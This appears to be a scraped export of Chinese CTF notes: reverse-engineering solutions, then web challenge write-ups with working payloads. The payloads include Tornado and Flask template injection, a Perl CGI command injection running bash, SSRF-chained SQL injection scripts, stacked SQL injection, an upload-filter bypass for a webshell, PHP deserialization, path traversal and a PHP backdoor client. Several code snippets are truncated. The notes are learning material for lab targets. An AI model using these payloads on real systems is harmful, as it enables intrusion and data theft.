.rodata:08048B0C db 70h ; p .rodata:08048B0D db 14h .rodata:08048B0E db 0 .rodata:08048B0F db 0 .rodata:08048B10 db 70h ; p .rodata:08048B11 db 14h .rodata:08048B12 db 0 .rodata:08048B13 db 0 .rodata:08048B14 db 64h ; d .rodata:08048B15 db 14h .rodata:08048B16 db 0 .rodata:08048B17 db 0 .rodata:08048B18 db 70h ; p .rodata:08048B19 db 14h .rodata:08048B1A db 0 .rodata:08048B1B db 0 .rodata:08048B1C db 64h ; d .rodata:08048B1D db 14h .rodata:08048B1E db 0 .rodata:08048B1F db 0 .rodata:08048B20 db 6Eh ; n .rodata:08048B21 db 14h .rodata:08048B22 db 0 .rodata:08048B23 db 0 .rodata:08048B24 db 7Bh ; { .rodata:08048B25 db 14h .rodata:08048B26 db 0 .rodata:08048B27 db 0 .rodata:08048B28 db 76h ; v .rodata:08048B29 db 14h .rodata:08048B2A db 0 .rodata:08048B2B db 0 .rodata:08048B2C db 78h ; x .rodata:08048B2D db 14h .rodata:08048B2E db 0 .rodata:08048B2F db 0 .rodata:08048B30 db 6Ah ; j .rodata:08048B31 db 14h .rodata:08048B32 db 0 .rodata:08048B33 db 0 .rodata:08048B34 db 73h ; s .rodata:08048B35 db 14h .rodata:08048B36 db 0 .rodata:08048B37 db 0 .rodata:08048B38 db 7Bh ; { .rodata:08048B39 db 14h .rodata:08048B3A db 0 .rodata:08048B3B db 0 .rodata:08048B3C db 80h .rodata:08048B3D db 14h .rodata:08048B3E db 0 .rodata:08048B3F db 0 .rodata:08048B40 db 0 .rodata:08048B41 db 0 .rodata:08048B42 db 0 .rodata:08048B43 db 0 很难导出来写。。。。 注意到程序中直接比较strcmp(ws,s2) 所以我们可以用gdb动态调试的方法截获s2也即计算出的明文 在IDA pro里分析函数 text:08048708 push ebp .text:08048709 mov ebp, esp .text:0804870B sub esp, 8028h .text:08048711 mov dword ptr [esp+4], offset dword_8048A90 ; wchar_t * .text:08048719 mov dword ptr [esp], offset s ; s .text:08048720 call decrypt .text:08048725 mov [ebp+s2], eax 可以看到s2的数据是从寄存器eax来的 所以我们只要查看寄存器eax的值就行了 gdb no-srtings-attached (gdb) break decrypt Breakpoint 1 at 0x804865c (gdb) run Starting program: /root/no-srtings-attached Welcome to cyber malware control software. Currently tracking 1373268125 bots worldwide Breakpoint 1, 0x0804865c in decrypt () (gdb) next Single stepping until exit from function decrypt, which has no line number information. 0x08048725 in authenticate () (gdb) x/sw $eax #sw s表示以字符串形式输出w表示word（4字节）形式(w_char) 0x804e800: U\"9447{you_are_an_international_mystery}\" 0x09 csaw2013reversing2 拖进IDA pro 核心代码如下 int __cdecl __noreturn main(int argc, const char **argv, const char **envp) { int v3; // ecx CHAR *lpMem; // [esp+8h] [ebp-Ch] HANDLE hHeap; // [esp+10h] [ebp-4h] hHeap = HeapCreate(0x40000u, 0, 0); lpMem = (CHAR *)HeapAlloc(hHeap, 8u, MaxCount + 1); memcpy_s(lpMem, MaxCount, &unk_409B10, MaxCount); if ( sub_40102A() || IsDebuggerPresent() ) { __debugbreak(); sub_401000(v3 + 4, lpMem); ExitProcess(0xFFFFFFFF); } MessageBoxA(0, lpMem + 1, \"Flag\", 2u); HeapFree(hHeap, 0, lpMem); HeapDestroy(hHeap); ExitProcess(0); } 点开sub_40102A() int sub_40102A() { char v0; // t1 v0 = *(_BYTE *)(*(_DWORD *)(__readfsdword(0x18u) + 48) + 2); return 0; } 所以无论如何都进不去if 应该就是这样导致乱码了 所以我们这里直接Path Program 把调试中断的汇编指令int 3改成nop空指令 然后把jnz改成jmp无条件跳转 然后在把loc_401096 结束后jmp到loc_4010B9上 变成这样 然后就不会乱码了 PS: 直接点击窗体ctrl+c是可以复制窗体内容的。。。。 0x0A getit IDA 反编译的得到 char v3; // al __int64 v5; // [rsp+0h] [rbp-40h] int i; // [rsp+4h] [rbp-3Ch] FILE *stream; // [rsp+8h] [rbp-38h] char filename[8]; // [rsp+10h] [rbp-30h] unsigned __int64 v9; // [rsp+28h] [rbp-18h] v9 = __readfsqword(0x28u); LODWORD(v5) = 0; while ( (signed int)v5 找一下t和s .data:00000000006010E0 t db 'S' ; DATA XREF: main+65↑w .data:00000000006010E0 ; main+C9↑o ... .data:00000000006010E1 aHarifctf db 'harifCTF{????????????????????????????????}',0 所以可以静态分析写解密脚本了 #include #include char s[]=\"c61b68366edeb7bdce3c6820314b7498\"; char t[]=\"SharifCTF{????????????????????????????????}\"; int main() { char v3; // al __int64 v5; // [rsp+0h] [rbp-40h] char filename[8]; // [rsp+10h] [rbp-30h] unsigned __int64 v9; // [rsp+28h] [rbp-18h] v5 = 0; while ( (signed int)v5 占个坑尝试一下动态调试的做法 0x0B Python_trade pycdc逆向得到 import base64 def encode(message): s = '' for i in message: x = ord(i) ^ 32 x = x + 16 s += chr(x) return base64.b64encode(s) correct = 'XlNkVmtUI1MgXWBZXCFeKY+AaXNt' flag = '' print 'Input flag:' flag = raw_input() if encode(flag) == correct: print 'correct' else: print 'wrong' 所以解密脚本就很好写了 import base64 def decode(message): message=base64.b64decode(message) s = '' for i in message: x = ord(i) - 16 x = x ^ 32 s += chr(x) return s correct = 'XlNkVmtUI1MgXWBZXCFeKY+AaXNt' print decode(correct) 0x0C maze 拖进IDA pro 核心代码如下 __int64 __fastcall main(__int64 a1, char **a2, char **a3) { signed __int64 v3; // rbx signed int v4; // eax bool v5; // bp bool v6; // al const char *v7; // rdi __int64 v9; // [rsp+0h] [rbp-28h] v9 = 0LL; puts(\"Input flag:\"); scanf(\"%s\", &s1, 0LL); if ( strlen(&s1) != 24 || strncmp(&s1, \"nctf{\", 5uLL) || *(&byte_6010BF + 24) != '}' ) { LABEL_22: puts(\"Wrong flag!\"); exit(-1); } v3 = 5LL; if ( strlen(&s1) - 1 > 5 ) { while ( 1 ) { v4 = *(&s1 + v3); v5 = 0; if ( v4 > 'N' ) { v4 = (unsigned __int8)v4; if ( (unsigned __int8)v4 == 'O' ) { v6 = sub_400650((_DWORD *)&v9 + 1); goto LABEL_14; } if ( v4 == 'o' ) { v6 = sub_400660((int *)&v9 + 1); goto LABEL_14; } } else { v4 = (unsigned __int8)v4; if ( (unsigned __int8)v4 == '.' ) { v6 = sub_400670(&v9); goto LABEL_14; } if ( v4 == '0' ) { v6 = sub_400680((int *)&v9); LABEL_14: v5 = v6; goto LABEL_15; } } LABEL_15: if ( !(unsigned __int8)sub_400690((__int64)asc_601060, SHIDWORD(v9), v9) ) goto LABEL_22; if ( ++v3 >= strlen(&s1) - 1 ) { if ( v5 ) break; LABEL_20: v7 = \"Wrong flag!\"; goto LABEL_21; } } } if ( asc_601060[8 * (signed int)v9 + SHIDWORD(v9)] != '#' ) goto LABEL_20; v7 = \"Congratulations!\"; LABEL_21: puts(v7); return 0LL; } 不会SHIDWORD(), 查了一下发现是IDA pro的宏定义 #define SHIDWORD(x) (*((int32*)&(x)+1)) 注意到x是个int64 所以SHIDWORD(x)应该就是取它的前32位（小端存） 写个脚本验证一下 #include int main(){ long long x=(15LL 因为要让 asc_601060[8 * (signed int)v9 + SHIDWORD(v9)] == '#' v9前32位应该表示的是列，而v9后32位是行 然后又有四个if条件，感觉真就是个迷宫 bool __fastcall sub_400650(_DWORD *a1)//O (_DWORD *)&v9 + 1 { int v1; // eax v1 = (*a1)--;//左 return v1 > 0; } bool __fastcall sub_400660(int *a1)//o (int *)&v9 + 1 { int v1; // eax v1 = *a1 + 1;//右 *a1 = v1; return v1 0; } bool __fastcall sub_400680(int *a1)//0 (int *)&v9 { int v1; // eax v1 = *a1 + 1;//下 *a1 = v1; return v1 然后我们把asc_601060里的东西按8个一行整理一下 ****** * * * *** * ** ** * ** * *# * ** *** * ** * ******** 然后就可以得到{}里面的flag部分了 o0oo00O000oooo..OO © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"adworld/easy_tornado.html":{"url":"adworld/easy_tornado.html","title":"Easy Tornado","keywords":"","body":"D5 T1 easytornadoD5 T1 easytornado 利用Tornado框架写的 猜是模板注入 访问hint.txt 提示flag in /fllllllllllllag 访问发现报错 但是很明显这个msg参数是有问题的 payload=/error?msg={{3}} 返回一个3 但是试了加法乘法都不行 查一查Tornado的模板注入 这时候就要学会阅读源码 hint里不是让我们去找cookie_secret吗 在Tornado的auth.py 从第360行起有 request_cookie = handler.get_cookie(\"_oauth_request_token\") if not request_cookie: raise AuthError(\"Missing OAuth request token cookie\") handler.clear_cookie(\"_oauth_request_token\") cookie_key, cookie_secret = [ base64.b64decode(escape.utf8(i)) for i in request_cookie.split(\"|\") ] if cookie_key != request_key: raise AuthError(\"Request token does not match cookie\") token = dict( key=cookie_key, secret=cookie_secret ) # type: Dict[str, Union[str, bytes]] 关键在这个handler 查一下handler的属性，发现了settings def _oauth_consumer_token(self) -> Dict[str, Any]: handler = cast(RequestHandler, self) handler.require_setting(\"twitter_consumer_key\", \"Twitter OAuth\") handler.require_setting(\"twitter_consumer_secret\", \"Twitter OAuth\") return dict( key=handler.settings[\"twitter_consumer_key\"], secret=handler.settings[\"twitter_consumer_secret\"], ) 利用模板注入读一下handler.settings试试 http://111.198.29.45:56392/error?msg={{handler.settings}} {'autoreload': True, 'compiled_template_cache': False, 'cookie_secret': '20a6dd59-a17c-48bb-8ab9-e265a9391413'} 果然返回了cookie_secret 猜测filehash值就是hint里的 md5(cookie_secret+md5(filename)) 跑一下脚本得到payload #coding=utf-8 import hashlib def md5(str): md5 = hashlib.md5() md5.update(str.encode()) return md5.hexdigest() cookie_secret = '20a6dd59-a17c-48bb-8ab9-e265a9391413' filename = '/fllllllllllllag' print md5(cookie_secret+md5(filename)) © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"adworld/i-got-id-200.html":{"url":"adworld/i-got-id-200.html","title":"i-got-id-200","keywords":"","body":"i-got-id-200参考资料i-got-id-200 用perl写的网站 然而我不会perl...... 有个文件上传界面 上传完会把文件里的东西以文本格式读出来显示在页面上 还是先抓个包看看 POST /cgi-bin/file.pl HTTP/1.1 Host: 111.198.29.45:57795 Content-Length: 292 Cache-Control: max-age=0 Origin: http://111.198.29.45:57795 Upgrade-Insecure-Requests: 1 DNT: 1 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDYZHzjAneIJ2wk7a User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://111.198.29.45:57795/cgi-bin/file.pl Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 Cookie: PHPSESSID=pqnmaqdihhvciqqc9uhaeod893 Connection: close ------WebKitFormBoundaryDYZHzjAneIJ2wk7a Content-Disposition: form-data; name=\"file\"; filename=\"233.txt\" Content-Type: text/plain 23333333 ------WebKitFormBoundaryDYZHzjAneIJ2wk7a Content-Disposition: form-data; name=\"Submit!\" Submit! ------WebKitFormBoundaryDYZHzjAneIJ2wk7a-- HTTP/1.1 200 OK Date: Thu, 16 Jan 2020 13:57:38 GMT Server: Apache/2.4.18 (Ubuntu) Vary: Accept-Encoding Content-Length: 564 Connection: close Content-Type: text/html; charset=ISO-8859-1 Perl File Upload Perl File Upload File: 23333333 查阅资料发现Perl CGI 有个很经典的漏洞类似这个题目 use strict; use warnings; use CGI; my $cgi = CGI->new; if ( $cgi->upload( 'file' ) ) { my $file = $cgi->param( 'file' ); while ( ) { print \"$_\"; } } 问题就处在这个上 “<>” doesn’t work with strings Unless the string is “ARGV” In that case, “<>” loops through the ARG values Inserting each one to an open() call! 所以我们试着加个ARGV就可以利用open()任意读文件了 根据参考资料中的ppt我们甚至可以用bash遍历一下目录 /cgi-bin/file.pl?/bin/bash%20-c%20ls${IFS}/| #遍历根目录 找到flag 直接读一下即可 参考资料 Perl CGI 问题：https://www.blackhat.com/docs/asia-16/materials/asia-16-Rubin-The-Perl-Jam-2-The-Camel-Strikes-Back.pdf © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"adworld/ics-02.html":{"url":"adworld/ics-02.html","title":"ics-02","keywords":"","body":"ics-02参考资料ics-02 文档管理中心提示下载一个paper,是关于SSRF的 抓包查看过程 GET /download.php?dl=ssrf HTTP/1.1 Host: 111.198.29.45:46494 Upgrade-Insecure-Requests: 1 DNT: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://111.198.29.45:46494/index.php Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 Cookie: JSESSIONID=206B255ED675C0EAF469D2BD32119F91 Connection: close 这个参数明示了SSRF了，试一下 GET /download.php?dl=233 HTTP/1.1 Host: 111.198.29.45:46494 Upgrade-Insecure-Requests: 1 DNT: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://111.198.29.45:46494/index.php Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 Cookie: JSESSIONID=206B255ED675C0EAF469D2BD32119F91 Connection: close HTTP/1.1 404 Not Found Date: Fri, 31 Jan 2020 13:39:28 GMT Server: Apache/2.4.7 (Ubuntu) X-Powered-By: PHP/5.5.9-1ubuntu4.22 Content-Description: File Transfer Content-Transfer-Encoding: binary Content-Length: 63 Connection: close Content-Type: application/octet-stream File 233.pdf doesn't exist. Please report the error to admin... 可以这里的参数加了后缀.pdf 试了一下00截断%00截断都不行 用nikto扫了一下，没啥了 用御剑扫了一下目录，有个/secret 里面两个文件 fuzz一下发现 secret.php可以提交表单，在 http://111.198.29.45:46494/secret/secret.php?s=3&txtfirst_name=A&txtmiddle_name=B&txtLast_name=C&txtname_suffix=D&txtdob=E&txtdl_nmbr=123456789&txtRetypeDL=123456789&btnContinue2=Continue 中，各参数是可控的 且服务端返回 Registration Success SUCCESSFULLY REGISTERED Confirm that the following data is correct so we know it was stored correctly in our database. Name: 12312, 213 DoB: 11/01/2000 提示这里可能存在sql注入点 问题来了怎么注呢........... 和之前的SSRF又有什么关系呢？？？ 注意到我们提交了9个参数 其中存进表里的应该是 txtfirst_name=a&txtmiddle_name=b&txtLast_name=c&txtname_suffix=d&txtdob=e&txtdl_nmbr=f&txtRetypeDL=f&btnContinue2=Continue 猜测后台的sql语句应该是 INSERT INTO (A,B,C,D,E,F) VALUES ('a','b','c','d','e','f') 并且f是唯一的 那么我们可以利用注释符来进行注入 比如 a=A','B',(\"+sqlquery+\"),'D'/* e=*/,'E 拼接后 INSERT INTO (A,B,C,D,E,F) VALUES ('A','B',(\"+sqlquery+\"),'D'/*','c','d','*/,'E','f') 可以利用python的request构造\"Exp\"： import requests import random url = 'http://111.198.29.45:46494/secret/secret.php?' sqlquery = \"version()\" id = random.randint(1, 10000000) payload = { \"s\": \"3\", \"txtfirst_name\": \"A','B',(\"+sqlquery+\"),'D'/*\", \"txtmiddle_name\": \"B\", \"txtLast_name\": \"C\", \"txtname_suffix\": \"D\", \"txtdob\": \"*/,'31/01/2020\", \"txtdl_nmbr\": id, \"txtRetypeDL\": id } r = requests.get(url, params=payload) print(r.text) 但是，返回的还是那个东西.... Registration Success SUCCESSFULLY REGISTERED Confirm that the following data is correct so we know it was stored correctly in our database. Name: C, A','B',(version()),'D'/* DoB: */,'31/01/2020 注释里提示了 # --> 但是前面那个secret_debug.php显示ip无权访问 修改XFF也不行 应该就是这里SSRF了 利用之前download.php的参数 可以构造Exp import requests import random import urllib url = 'http://111.198.29.45:46494/download.php' #sqlquery = \"version()\" #sqlquery = \"database()\" #sqlquery = \"select table_name from information_schema.tables where table_schema='ssrfw' LIMIT 1\" #sqlquery = \"select column_name from information_schema.columns where table_name='cetcYssrf' LIMIT 1\" #sqlquery = \"select column_name from information_schema.columns where table_name='cetcYssrf' LIMIT 1, 1\" sqlquery = \"select value from cetcYssrf LIMIT 1\" qid = random.randint(1, 10000000) d = ('http://127.0.0.1/secret/secret_debug.php?' + urllib.parse.urlencode({ \"s\": \"3\", \"txtfirst_name\": \"A','B',(\"+sqlquery+\"),'D'/*\", \"txtmiddle_name\": \"B\", \"txtLast_name\": \"C\", \"txtname_suffix\": \"D\", \"txtdob\": \"*/,'31/01/2020\", \"txtdl_nmbr\": qid, \"txtRetypeDL\": qid }) + \"&\") #注意？号的使用 r = requests.get(url, params={\"dl\": d}) print(r.text) 参考资料 SSRF攻击： https://xz.aliyun.com/t/2115 本题Poc的构造: https://www.guildhab.top/?p=708 © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"adworld/ics-07.html":{"url":"adworld/ics-07.html","title":"ics-07","keywords":"","body":"D4 T2 ics-07参考资料D4 T2 ics-07 界面有个view-source给了个源码 看了一下发现有上传点 但是需要拿到admin的session 接着看源码 something wae wrong ! \"); if($result){ echo \"id: \".$result->id.\"\"; echo \"name:\".$result->user.\"\"; $_SESSION['admin'] = True; } ?> 如果拿到session需要传入的 floatval($_GET[id]) !== '1' (其实强类型比较怎么这里怎么都可。。。。) 并且 substr($_GET[id], -1) === '9' 并且在数据库中要能查到（放在一起） 好像只有一条记录用空格截断就可 payload=/index.php?page=flag&id=1+9&submit=提交# 然后可以传文件了 con=233&file=233.txt 但是 preg_match('/.+\\.ph(p[3457]?|t|tml)$/i', $filename)//$匹配末尾 把.php/php5等一众后缀名过滤了,怎么让传上去的文件能被php解析呢？ 对于这种只检测末尾的 我们可以这样绕过 con=&file=cmd.php/1.php/.. ..是上级目录 相当于会上传到/uploaded/backup/ 同时绕过了后缀检测 然后就可以用蚁剑连上去了 参考资料 解析漏洞：https://www.guildhab.top/?p=481 © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"adworld/shrine.html":{"url":"adworld/shrine.html","title":"shrine","keywords":"","body":"shrine参考资料shrine 题目来源：TokyoWesterns CTF https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5423&page=2 访问网站，拿到源码 import flask import os app = flask.Flask(__name__) app.config['FLAG'] = os.environ.pop('FLAG') @app.route('/') def index(): return open(__file__).read() @app.route('/shrine/') def shrine(shrine): def safe_jinja(s): s = s.replace('(', '').replace(')', '') blacklist = ['config', 'self'] return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s return flask.render_template_string(safe_jinja(shrine)) if __name__ == '__main__': app.run(debug=True) 显然是/shrine/下模板注入，但是要绕过safe_jinjia 如果我们可以用config的话 直接 /shrine/{{config}} -> 可以拿到flag 如果我们可以用self /shrine/{{self}} -> /shrine/{{self.__dict__}} -> {'_TemplateReference__context': , 'g': , 'request': , 'namespace': , 'lipsum': , 'aaaa': None, 'range': , 'session': , 'dict': , 'get_flashed_messages': , 'cycler': , 'joiner': , 'config': } of None>} 也可拿到flag 如果我们可以用() 根据Flask SSTI的套路 一步步fuzz 最后可以得到payload {{[].__class__.__base__.__subclasses__()[68].__init__.__globals__['os'].__dict__.environ['FLAG]}} -> 'FLAG': 'TWCTF{secret}' 然而这些都没有，这怎么办 这里就要利用强大的current_app了，拥有当前应用的所有环境 怎么拿到curren_app呢 根据大佬的wp, 一种方法是利用url_for(这里没有过滤)，在``````可以找到current_app 'current_app': 然后就有payload {{url_for.__globals__['current_app'].config['FLAG']}} 或者利用get_flashed_messages也可找到current_app {{get_flashed_messages.__globals__}} -> 事实上，遇到flask SSTI,我们不妨可以试试这几个类 url_for, g, request, namespace, lipsum, range, session, dict, get_flashed_messages, cycler, joiner, config,self 参考资料 Flask之SSTI模板注入： https://xi4or0uji.github.io/2019/01/15/flask%E4%B9%8Bssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ python沙箱逃逸总结： http://shaobaobaoer.cn/archives/656/python-sandbox-escape 本题详细的wp: https://ctftime.org/writeup/10895 © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"adworld/super_sqli.html":{"url":"adworld/super_sqli.html","title":"super_sqli","keywords":"","body":"supersqli参考资料：supersqli 试一下注入 ?inject=?inject=1' or '1'='1 返回 array(2) { [0]=> string(1) \"1\" [1]=> string(7) \"hahahah\" } array(2) { [0]=> string(1) \"2\" [1]=> string(12) \"miaomiaomiao\" } array(2) { [0]=> string(6) \"114514\" [1]=> string(2) \"ys\" } 看了存在注入点 试一下注入 ?inject=1' union select database()# 显示 return preg_match(\"/select|update|delete|drop|insert|where|\\./i\",$inject); 看了是过滤了select|update|delete|drop|insert|where，这怎么搞。。。。 看了大佬的博客，发现了堆叠注入这一操作 试一下 ?inject=1';show databases;# 返回 array(2) { [0]=> string(1) \"1\" [1]=> string(7) \"hahahah\" } array(1) { [0]=> string(11) \"ctftraining\" } array(1) { [0]=> string(18) \"information_schema\" } array(1) { [0]=> string(5) \"mysql\" } array(1) { [0]=> string(18) \"performance_schema\" } array(1) { [0]=> string(9) \"supersqli\" } array(1) { [0]=> string(4) \"test\" } show tables返回两张表 array(1) { [0]=> string(16) \"1919810931114514\" } array(1) { [0]=> string(5) \"words\" } 存在堆叠注入 利用 @t=(sql 查询语句的hex值);prepare x from @t;execute x;# bypass进行堆叠注入 python >>> import binascii >>> binascii.b2a_hex(\"select * from supersqli.1919810931114514\") '73656c656374202a2066726f6d20737570657273716c692e31393139383130393331313134353134' 可得 payload=?inject=1';set @t=0x73656c656374202a2066726f6d20737570657273716c692e31393139383130393331313134353134;Prepare x from @t;Execute x;# 有一个坑点是题目用strstr对prepare和excute做了过滤，但是可以通过改变大小写来bypass 第二种方法是利用chr()拼接bypass 可以利用python写个脚本跑一跑 payload = \"1';set @s=concat(%s);PREPARE a FROM @s;EXECUTE a;\" exp = \"select flag from `1919810931114514`\" res = '' for i in exp: res += \"char(%s),\"%(ord(i)) encode_payload = payload%(res[:-1]) print encode_payload 第三种方法是利用堆叠注入把1919810931114514这个表重命名为word，然后查询的时候就可直接查到这个表了 payload=1';RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;# 参考资料： 堆叠注入：https://www.cnblogs.com/0nth3way/articles/7128189.html 两种解法：https://blog.zeddyu.info/2019/06/04/2019qwb/#%E9%9A%8F%E4%BE%BF%E6%B3%A8 char的解法:https://skysec.top/2019/05/25/2019-%E5%BC%BA%E7%BD%91%E6%9D%AFonline-Web-Writeup/#%E9%9A%8F%E4%BE%BF%E6%B3%A8 © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"adworld/web_php_unserialize.html":{"url":"adworld/web_php_unserialize.html","title":"Web_php_unserialize","keywords":"","body":"Web_php_unserialize参考资料Web_php_unserialize php反序列化加一些奇奇怪怪的绕过 题目源码 file = $file; } function __destruct() { echo @highlight_file($this->file, true); } function __wakeup() { if ($this->file != 'index.php') { //the secret is in the fl4g.php $this->file = 'index.php'; } } } if (isset($_GET['var'])) { $var = base64_decode($_GET['var']); if (preg_match('/[oc]:\\d+:/i', $var)) { die('stop hacking!'); } else { @unserialize($var); } } else { highlight_file(\"index.php\"); } ?> 我们希望能读到fl4g.php 所以要借助反序列化中的_destruct()函数，但是\\_wakeup()会覆盖我们写进去的地址 这里涉及到一个漏洞 CVE-2016-7124 简单来说就是当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行 那么preg_match的过滤怎么办呢 根据正则表达式的语法可知，检测的应该是类似 O:4:这样的 [oc]字符组 /d 数字 /i 忽略大小写 可以加个+来绕过 一开始自己写序列化对象怎么写都不对 但其实可以用php输出一个序列化对象，然后再改。。。。 或者也可以直接用脚本 file = $file; } function __destruct() { echo @highlight_file($this->file, true); } function __wakeup() { if ($this->file != 'index.php') { //the secret is in the fl4g.php $this->file = 'index.php'; } } } $o = new Demo('fl4g.php'); $s = serialize($o); //string(49) \"O:4:\"Demo\":1:{s:10:\"Demofile\";s:8:\"fl4g.php\";}\" $s = str_replace('O:4', 'O:+4',$b);//绕过__preg_match $s = str_replace(':1:', ':2:',$b);//绕过__wakeup echo (base64_encode($s));//payload ?> 参考资料 正则表达式： https://www.cnblogs.com/zery/p/3438845.html https://blog.csdn.net/weixin_33682790/article/details/85996972 © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"adworld/web_php_wrong_nginx_config.html":{"url":"adworld/web_php_wrong_nginx_config.html","title":"web_php_wrong_nginx_config","keywords":"","body":"Web_php_wrong_nginx_config参考资料Web_php_wrong_nginx_config 打开靶机提示未登陆并跳转到/login.php 看了一下cookie isLogin=0 改成1就可以了.... 登进去以后发现URL变成了 http://111.198.29.45:42014/admin/admin.php?file=index&ext=php 猜测是个LFI 但是fuzz了几个都不行，也不知道回显在哪.... 想起来去翻了翻robots.txt 有两个 //hint.php 配置文件也许有问题呀：/etc/nginx/sites-enabled/site.conf 提示我们要去读这个文件 hack.php貌似和admin.php里的东西一样 最终都会跳转到 http://111.198.29.45:42014/admin/admin.php?file=index&ext=php 这里fuzz了好久..... 最后发现应该是过滤了../ 用双写发可以绕过 ....//....//....//....//....//....//....//....//etc/passwd ....//....//....//....//....//....//....//....//etc/nginx/sites-enabled/site.conf 拿到config文件 server { listen 8080; ## listen for ipv4; this line is default and implied listen [::]:8080; ## listen for ipv6 root /var/www/html; index index.php index.html index.htm; port_in_redirect off; server_name _; # Make site accessible from http://localhost/ #server_name localhost; # If block for setting the time for the logfile if ($time_iso8601 ~ \"^(\\d{4})-(\\d{2})-(\\d{2})\") { set $year $1; set $month $2; set $day $3; } # Disable sendfile as per https://docs.vagrantup.com/v2/synced-folders/virtualbox.html sendfile off; set $http_x_forwarded_for_filt $http_x_forwarded_for; if ($http_x_forwarded_for_filt ~ ([0-9]+\\.[0-9]+\\.[0-9]+\\.)[0-9]+) { set $http_x_forwarded_for_filt $1???; } # Add stdout logging access_log /var/log/nginx/$hostname-access-$year-$month-$day.log openshift_log; error_log /var/log/nginx/error.log info; location / { # First attempt to serve request as file, then # as directory, then fall back to index.html try_files $uri $uri/ /index.php?q=$uri&$args; server_tokens off; } #error_page 404 /404.html; # redirect server error pages to the static page /50x.html # error_page 500 502 503 504 /50x.html; location = /50x.html { root /usr/share/nginx/html; } location ~ \\.php$ { try_files $uri $uri/ /index.php?q=$uri&$args; fastcgi_split_path_info ^(.+\\.php)(/.+)$; fastcgi_pass unix:/var/run/php/php5.6-fpm.sock; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; fastcgi_param SCRIPT_NAME $fastcgi_script_name; fastcgi_index index.php; include fastcgi_params; fastcgi_param REMOTE_ADDR $http_x_forwarded_for; } location ~ /\\. { log_not_found off; deny all; } location /web-img { alias /images/;#存在目录穿越问题 autoindex on;#此次打开了路径浏览 } location ~* \\.(ini|docx|pcapng|doc)$ { deny all; } include /var/www/nginx[.]conf; payload=http://111.198.29.45:42014/web-img../ 发现我们现在可以看到靶机上所有文件了 遍历看一下 在/var/www/下找到一个hack.php.bak $d\"|U);@ses|U|Usion_des|Utroy();}}}}'; $j='$k|Uh=\"|U|U42f7\";$kf=\"e9ac\";fun|Uction|U |Ux($t,$k){$c|U=|Ustrlen($k);$l=s|Utrl|Ue|Un($t);$o=|U\"\";fo|Ur($i=0;$i 只能大概看懂最后三行在干嘛 把$f打印出来看看 $kh=\"42f7\";$kf=\"e9ac\";function x($t,$k){$c=strlen($k);$l=strlen($t);$o=\"\";for($i=0;$i$d\");@session_destroy();}}}} 看起来像个后门 最后找到了现成的利用脚本 # encoding: utf-8 from random import randint,choice from hashlib import md5 import urllib import string import zlib import base64 import requests import re def choicePart(seq,amount): length = len(seq) if length == 0 or length ') while cmd != '': # build junk data in referer query = [] for i in xrange(max(indexes)+1+randint(0,2)): key = randAlpha(randint(3,6)) value = base64.urlsafe_b64encode(randBytesFlow(randint(3,12))) query.append((key, value)) debugPrint('Before insert payload:') debugPrint(query) debugPrint(urllib.urlencode(query)) # encode payload payload = zlib.compress(cmd) payload = loopXor(payload,xorKey) payload = base64.urlsafe_b64encode(payload) payload = md5head + payload # cut payload, replace into referer cutIndex = randint(2,len(payload)-3) payloadPieces = (payload[0:cutIndex], payload[cutIndex:], md5tail) iPiece = 0 for i in indexes: query[i] = (query[i][0],payloadPieces[iPiece]) iPiece += 1 referer = url + '?' + urllib.urlencode(query) debugPrint('After insert payload, referer is:') debugPrint(query) debugPrint(referer) # send request r = sess.get(url,headers={'Accept-Language':acceptLangStr,'Referer':referer},proxies=proxies) html = r.text debugPrint(html) # process response pattern = re.compile(r'(.*)' % (xorKey,xorKey)) output = pattern.findall(html) if len(output) == 0: print 